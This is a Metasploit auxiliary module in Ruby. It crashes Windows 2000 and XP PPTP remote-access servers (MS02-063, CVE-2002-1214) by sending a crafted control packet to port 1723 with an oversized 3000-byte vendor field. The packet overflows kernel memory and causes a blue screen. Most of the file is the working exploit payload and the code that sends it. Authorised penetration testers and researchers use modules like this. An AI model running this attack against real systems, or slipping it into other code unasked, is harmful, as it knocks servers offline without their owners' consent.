##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'	=> 'MS02-063 PPTP Malformed Control Data Kernel Denial of Service',
        'Description'	=> %q{
          This module exploits a kernel based overflow when sending abnormal PPTP Control Data
          packets	to Microsoft Windows 2000 SP0-3 and XP SP0-1 based PPTP RAS servers
          (Remote Access Services). Kernel memory is overwritten resulting in a BSOD.
          Code execution may be possible however this module is only a DoS.
        },
        'Author' => [ 'aushack' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'BID', '5807' ],
          [ 'CVE', '2002-1214' ],
          [ 'OSVDB', '13422' ],
          [ 'MSB', 'MS02-063' ],
        ],
        'DisclosureDate' => '2002-09-26',
        'Notes' => {
          'Stability' => [CRASH_OS_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(1723),
      ]
    )
  end

  def run
    connect

    # Fields borrowed from Wireshark :)
    sploit = "\x00\x9c" # length
    sploit << "\x00\x01" # control message
    sploit << "\x1a\x2b\x3c\x4d" # cookie
    sploit << "\x00\x01" # start control connection req
    sploit << "\x00\x00" # reserved
    sploit << "\x01\x00" # protocol version
    sploit << "\x00\x00" # reserved
    sploit << "\x00\x03" # framing capabilities
    sploit << "\x00\x00\x00\x02" # bearer capabilities
    sploit << "\xff\xff" # max channels
    sploit << "\x0a\x28" # firmware revision
    sploit << "\x00\x01" # Hostname
    sploit << 'A' * 3000 # Vendor - trigger vuln

    print_status('Sending PPTP DoS Packet...')

    sock.put(sploit)

    print_status('Packet sent. Kernel should halt on a Stop Error (BSOD).')

    disconnect
  end
end
